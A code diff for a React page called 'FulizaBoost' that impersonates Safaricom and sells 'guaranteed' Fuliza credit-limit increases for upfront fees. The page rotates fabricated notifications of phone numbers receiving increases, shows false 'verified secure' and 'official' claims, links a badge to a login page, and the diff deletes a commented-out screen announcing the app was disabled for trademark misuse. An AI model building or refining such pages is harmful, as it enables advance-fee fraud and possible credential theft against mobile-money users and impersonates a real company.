@@ -8,7 +8,6 @@ type LimitOption = {
 };
 
 const limits: LimitOption[] = [
-  
   { amount: 5000, fee: 149 },
   { amount: 10000, fee: 250 },
   { amount: 15000, fee: 500 },
@@ -19,9 +18,8 @@ const limits: LimitOption[] = [
   { amount: 45000, fee: 5000 },
   { amount: 50000, fee: 7500 },
   { amount: 55000, fee: 8000 },
-   { amount: 60000, fee: 9000 },
-    { amount: 65000, fee: 10000 },
-     
+  { amount: 60000, fee: 9000 },
+  { amount: 65000, fee: 10000 },
 ];
 
 const notifications = [
@@ -45,7 +43,6 @@ const notificationTimes = [
   { label: "10 mins ago", weight: 3 },
 ];
 
-
 const getRandomTime = () => {
   const totalWeight = notificationTimes.reduce((sum, t) => sum + t.weight, 0);
   let rand = Math.random() * totalWeight;
@@ -54,7 +51,7 @@ const getRandomTime = () => {
     if (rand < t.weight) return t.label;
     rand -= t.weight;
   }
-  return "just now"; 
+  return "just now";
 };
 
 const Home = () => {
@@ -63,65 +60,56 @@ const Home = () => {
     ...notifications[0],
     time: "just now",
   });
-  const [showNotification, setShowNotification] = useState(true);
   const navigate = useNavigate();
 
-  
+  // Update only the content every 4 seconds
   useEffect(() => {
     const interval = setInterval(() => {
-      setShowNotification(false);
-
-      setTimeout(() => {
-        const randomIndex = Math.floor(Math.random() * notifications.length);
-
-        setCurrentNotification({
-          ...notifications[randomIndex],
-          time: getRandomTime(),
-        });
-
-        setShowNotification(true);
-      }, 300);
-    }, 4000);
+      const randomIndex = Math.floor(Math.random() * notifications.length);
+      setCurrentNotification({
+        ...notifications[randomIndex],
+        time: getRandomTime(),
+      });
+    }, 2000);
 
     return () => clearInterval(interval);
   }, []);
 
   const handleBadgeClick = () => {
-    navigate("/login"); 
+    navigate("/login");
   };
 
   return (
     <main className="container">
-      
       <div className="badge" onClick={handleBadgeClick}>
         ● SAFARICOM OFFICIAL
       </div>
 
-    
-      <div className={`notification-overlay ${showNotification ? "show" : ""}`}>
-        <div className="notification-icon"></div>
-        <div className="notification-content">
+      <h1 className="title">FulizaBoost</h1>
+      <p className="subtitle">Instant Limit Increase • Guaranteed Approval</p>
+
+      {/* Inline Notification */}
+      <div className="notification-inline">
+        <div className="notification-icon">⚡</div>
+        <div
+          className="notification-content"
+          key={currentNotification.phone + currentNotification.limit} // updates only content
+        >
           <strong>{currentNotification.phone}</strong> increased to Ksh{" "}
           {currentNotification.limit.toLocaleString()}
           <div className="notification-time">• {currentNotification.time}</div>
         </div>
       </div>
 
-      <h1 className="title">FulizaBoost</h1>
-      <p className="subtitle">Instant Limit Increase • Guaranteed Approval</p>
-
-    
       <div className="info-box">
         ⚡ Choose your new Fuliza limit and complete the payment to get instant
         access.
       </div>
 
-    
       <h3 className="section-title">Select Your Fuliza Limit</h3>
       <div className="grid">
         {limits.map((item) => {
           const isActive = selectedAmount === item.amount;
-
           return (
             <div
               key={item.amount}
@@ -135,12 +123,10 @@ const Home = () => {
         })}
       </div>
 
-      
       <div className="secure">🔒 VERIFIED SECURE • END-TO-END ENCRYPTED</div>
 
       <button
         className={`continue-btn ${selectedAmount ? "enabled" : ""}`}
-       
         onClick={() => {
           const selectedLimit = limits.find((l) => l.amount === selectedAmount);
           if (selectedLimit) {
@@ -156,46 +142,3 @@ const Home = () => {
 };
 
 export default Home;
-
-
-// import { useEffect, useState } from "react";
-// import "../styles/Home.css";
-
-// const Home = () => {
-//   const [status, setStatus] = useState<"connecting" | "failed">("connecting");
-
-//   useEffect(() => {
-//     const timer = setTimeout(() => {
-//       setStatus("failed");
-//     }, 2500); 
-
-//     return () => clearTimeout(timer);
-//   }, []);
-
-//   return (
-//     <div className={`block-overlay ${status === "failed" ? "error" : ""}`}>
-//       <div className="block-card">
-//         {status === "connecting" ? (
-//           <>
-//             <div className="spinner"></div>
-//             <p className="block-title">Connecting to network…</p>
-//             <p className="block-sub">Verifying security configuration</p>
-//           </>
-//         ) : (
-//           <>
-//             <p className="block-error-title">Connection Failed</p>
-//             <p className="block-error-text">
-//               This application has been disabled due to invalid security
-//               configuration and unauthorized use of Safaricom trademarks.
-//             </p>
-//             <p className="block-error-text">
-//               © Safaricom PLC. All rights reserved.
-//             </p>
-//           </>
-//         )}
-//       </div>
-//     </div>
-//   );
-// };
-
-// export default Home;
